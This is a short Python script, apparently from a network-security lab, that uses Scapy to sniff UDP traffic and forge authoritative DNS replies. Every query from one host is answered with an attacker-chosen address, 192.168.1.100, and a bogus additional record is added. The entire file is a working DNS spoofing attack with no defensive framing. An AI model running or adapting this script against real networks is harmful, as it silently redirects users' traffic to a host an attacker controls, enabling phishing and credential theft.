from scapy.all import *
import datetime

#Called for every UDP packet
def intercept(pkt):
	print('HIT')
	#Only spoof DNS queries that come from h1
	if IP not in pkt or pkt[IP].src != "192.168.1.101" or DNSQR not in pkt[UDP]:
		return
	#Swap src and dest's IP and port. 
	#Use the query's ID and question record for the reply.
	spoof = IP(dst=pkt[IP].src, src=pkt[IP].dst)/UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)/DNS(id=pkt[DNS].id, qr=1, aa=1, qdcount=1, qd=DNSQR(qname=pkt[DNSQR].qname), ancount=1, an=DNSRR(rrname=pkt[DNSQR].qname, rdata='192.168.1.100'), arcount=1, ar=DNSRR(rrname='Spoofed.Website', rdata='192.168.1.100'))
	#Send packet on configured interface
	send(spoof)
	
#Examine every packet to/from h1 and call intercept function for all UDP packets
sniff(iface="eth0", filter="udp", prn=intercept)
